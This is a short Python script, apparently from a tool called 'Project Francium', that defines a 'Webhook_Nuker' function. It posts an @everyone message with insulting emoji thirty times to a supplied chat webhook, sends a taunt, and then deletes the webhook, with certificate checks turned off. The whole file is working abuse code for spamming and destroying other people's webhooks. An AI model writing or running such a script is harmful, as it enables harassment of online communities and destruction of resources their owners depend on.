import requests
from time import sleep

def Webhook_Nuker(webhook):
    payload = {
        "content": '@everyone you are being nuked by Project Francium. :gorilla: :middle_finger: :gorilla: '
    }

    x = 0

    while x < 30:
        try:
            requests.post(webhook, json = payload, verify = False)
            print('Spammed #' + x)
        except:
            pass
        x = x + 1
    try:
        sleep(1)
        payload = {
            "content": 'Deleted webhook xx ^-^ uwu'
            }
        requests.post(webhook, json = payload, verify = False)
        requests.delete(webhook, verify = False)
        print('Deleted Webhook')

    except:
        pass
    
